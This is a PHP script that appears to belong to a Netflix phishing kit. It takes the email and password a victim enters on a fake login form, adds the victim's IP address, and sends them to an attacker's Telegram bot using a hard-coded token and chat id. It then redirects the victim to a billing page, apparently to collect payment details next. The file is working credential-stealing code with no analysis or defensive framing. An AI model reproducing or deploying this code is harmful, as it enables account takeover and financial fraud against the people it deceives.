<?php
$ip = getenv("REMOTE_ADDR");


    $email = $_POST['mail'];
    $pass = $_POST['pass'];

        $tmsg = "---------- Netflix Login ---------\n\r";
        $tmsg .= "Email: $email \n";
        $tmsg .= "Password: $pass \n";
        $tmsg .= "IP VICTIME: $ip \n";
        $tmsg .= "--------------------------------------\n";
        
                    file_get_contents("https://api.telegram.org/bot5438337714:AAEZN74LWgeLD-WfzjB4wTtFBcsqvnk4plA/sendMessage?chat_id=-856735443&text=" . urlencode($tmsg)."" );
 
        header("Location: ../billing.php");
?>
